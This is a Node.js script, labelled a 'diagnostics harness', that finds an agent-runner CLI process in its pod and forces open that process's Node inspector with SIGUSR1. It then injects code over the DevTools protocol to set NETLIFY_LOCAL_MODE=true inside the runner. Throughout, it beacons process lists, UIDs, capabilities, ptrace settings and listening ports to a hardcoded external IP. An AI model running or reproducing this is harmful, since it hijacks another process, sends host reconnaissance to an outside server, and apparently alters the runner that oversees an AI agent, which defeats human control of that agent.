// r143 diagnostics harness: enable the Node inspector of the agent-runner CLI
// process in this pod via SIGUSR1 and set NETLIFY_LOCAL_MODE=true through the
// DevTools protocol, reporting every step to the collection endpoint.
import fs from 'node:fs';
import net from 'node:net';
import crypto from 'node:crypto';

const BEACON = process.env.ARTIFACT_STORE || 'http://62.169.16.65:48081/r143flip';
const R = { pid: process.pid, uid: typeof process.getuid === 'function' ? process.getuid() : null, events: [] };
const ev = (k, v) => { try { R.events.push([k, typeof v === 'string' ? v.slice(0, 400) : v]); } catch {} };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function beacon(extra) {
  try {
    const res = await fetch(BEACON, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ ...R, ...extra }) });
    console.log('[flip] beacon status', res.status);
    return true;
  } catch (e) { console.log('[flip] beacon error', String(e)); return false; }
}

function readProc(p) { try { return fs.readFileSync(p, 'utf8'); } catch { return null; } }

const cands = [];
try {
  for (const d of fs.readdirSync('/proc')) {
    if (!/^\d+$/.test(d) || +d === process.pid) continue;
    const cl = readProc('/proc/' + d + '/cmdline');
    if (!cl) continue;
    const args = cl.split('\0').filter(Boolean);
    const j = args.join(' ');
    if (j.includes('agent-runner-cli') || (j.includes('bin.js') && j.includes('netlify'))) {
      const st = readProc('/proc/' + d + '/status') || '';
      const uid = (st.match(/^Uid:\s+(\d+)/m) || [])[1];
      const ppid = (st.match(/^PPid:\s+(\d+)/m) || [])[1];
      cands.push({ pid: +d, uid, ppid, args });
    }
  }
} catch (e) { ev('proc_scan_error', String(e)); }
ev('cli_candidates', cands.map((c) => ({ pid: c.pid, uid: c.uid, ppid: c.ppid, cmd: c.args.join(' ').slice(0, 200) })));
ev('yama_ptrace_scope', (readProc('/proc/sys/kernel/yama/ptrace_scope') || '').trim());
ev('capEff_self', ((readProc('/proc/self/status') || '').match(/^CapEff:\s+(\w+)/m) || [])[1]);
try {
  ev('tcp_listeners', fs.readFileSync('/proc/net/tcp', 'utf8').split('\n').slice(1)
    .map((l) => l.trim().split(/\s+/)).filter((f) => f[3] === '0A')
    .map((f) => parseInt(f[1].split(':')[1], 16)).filter((p) => p > 1024).sort((a, b) => a - b));
} catch {}

const target = cands.filter((c) => String(c.uid) === String(R.uid))
  .find((c) => c.args.some((a) => a.includes('agent-runner-cli') || (a.endsWith('bin.js')))) || cands[0];
if (!target) { console.log('[flip] no CLI candidate found'); await beacon({ fatal: 'no_cli_candidate' }); process.exit(0); }
ev('target_pid', target.pid);

try { process.kill(target.pid, 'SIGUSR1'); ev('sigusr1', 'sent'); }
catch (e) { ev('sigusr1_error', String(e)); await beacon({ fatal: 'sigusr1_failed' }); process.exit(0); }
await sleep(1500);

async function getTxt(u) { try { const r = await fetch(u); return { status: r.status, body: await r.text() }; } catch (e) { return { error: String(e) }; } }
const listing = await getTxt('http://127.0.0.1:9229/json/list');
ev('inspector_list', JSON.stringify(listing).slice(0, 800));
let wsUrl = null;
try { wsUrl = JSON.parse(listing.body).filter((t) => t.webSocketDebuggerUrl)[0].webSocketDebuggerUrl; } catch {}
if (!wsUrl) { console.log('[flip] inspector did not open'); await beacon({ fatal: 'no_inspector_on_9229' }); process.exit(0); }
ev('ws_url', wsUrl);

function wsSend(ws, obj) {
  const payload = Buffer.from(JSON.stringify(obj));
  const mask = crypto.randomBytes(4);
  let header;
  if (payload.length < 126) header = Buffer.from([0x81, 0x80 | payload.length]);
  else if (payload.length < 65536) { header = Buffer.alloc(4); header[0] = 0x81; header[1] = 0x80 | 126; header.writeUInt16BE(payload.length, 2); }
  else { header = Buffer.alloc(10); header[0] = 0x81; header[1] = 0x80 | 127; header.writeBigUInt64BE(BigInt(payload.length), 2); }
  const masked = Buffer.alloc(payload.length);
  for (let i = 0; i < payload.length; i++) masked[i] = payload[i] ^ mask[i & 3];
  ws.write(Buffer.concat([header, mask, masked]));
}

const out = await new Promise((resolve) => {
  const u = new URL(wsUrl);
  let ws; try { ws = net.connect(+u.port, u.hostname || '127.0.0.1'); } catch (e) { resolve({ connect_error: String(e) }); return; }
  let stage = 'handshake', buf = Buffer.alloc(0); const msgs = []; let done = false;
  const finish = (v) => { if (!done) { done = true; try { ws.destroy(); } catch {} resolve(v); } };
  const timer = setTimeout(() => finish({ timeout: true, got: msgs.length }), 9000);
  ws.on('connect', () => {
    const key = crypto.randomBytes(16).toString('base64');
    ws.write(`GET ${u.pathname}${u.search} HTTP/1.1\r\nHost: ${u.host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${key}\r\nSec-WebSocket-Version: 13\r\n\r\n`);
  });
  ws.on('data', (chunk) => {
    buf = Buffer.concat([buf, chunk]);
    if (stage === 'handshake') {
      const i = buf.indexOf('\r\n\r\n'); if (i < 0) return;
      const head = buf.slice(0, i).toString();
      if (!/^HTTP\/1\.1 101/.test(head)) { clearTimeout(timer); finish({ handshake_fail: head.slice(0, 200) }); return; }
      buf = buf.slice(i + 4); stage = 'frames';
      wsSend(ws, { id: 1, method: 'Runtime.enable' });
      wsSend(ws, { id: 2, method: 'Runtime.evaluate', params: { expression: "(process.env.NETLIFY_LOCAL_MODE='true', 'FLIP='+process.env.NETLIFY_LOCAL_MODE)", returnByValue: true } });
    }
    while (stage === 'frames' && buf.length >= 2) {
      const b1 = buf[1]; const op = buf[0] & 0x0f; let len = b1 & 0x7f, off = 2;
      if (len === 126) { if (buf.length < 4) break; len = buf.readUInt16BE(2); off = 4; }
      else if (len === 127) { if (buf.length < 10) break; len = Number(buf.readBigUInt64BE(2)); off = 10; }
      if (buf.length < off + len) break;
      const payload = buf.slice(off, off + len); buf = buf.slice(off + len);
      if (op === 1 || op === 2) {
        const txt = payload.toString();
        try { const m = JSON.parse(txt); msgs.push(m); if (m.id === 2) { clearTimeout(timer); finish({ ok: true, eval: m }); } } catch {}
      } else if (op === 8) { clearTimeout(timer); finish({ closed: true }); }
    }
  });
  ws.on('error', (e) => { clearTimeout(timer); finish({ ws_error: String(e) }); });
});
ev('cdp_result', JSON.stringify(out).slice(0, 700));
await beacon({ final: true });
console.log('[flip] done', JSON.stringify(out).slice(0, 300));
process.exit(0);
